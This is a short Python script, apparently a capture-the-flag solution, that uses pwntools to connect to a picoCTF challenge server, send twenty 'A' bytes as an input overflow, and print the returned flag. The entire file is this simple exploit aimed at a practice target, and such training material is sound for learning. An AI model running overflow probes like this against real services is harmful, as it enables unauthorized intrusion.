from pwn import *

host = "saturn.picoctf.net"
port = 12345

io = remote(host, port)

io.sendlineafter(b": ", b"A" * 20)

flag = io.recvall().decode()
print(flag)
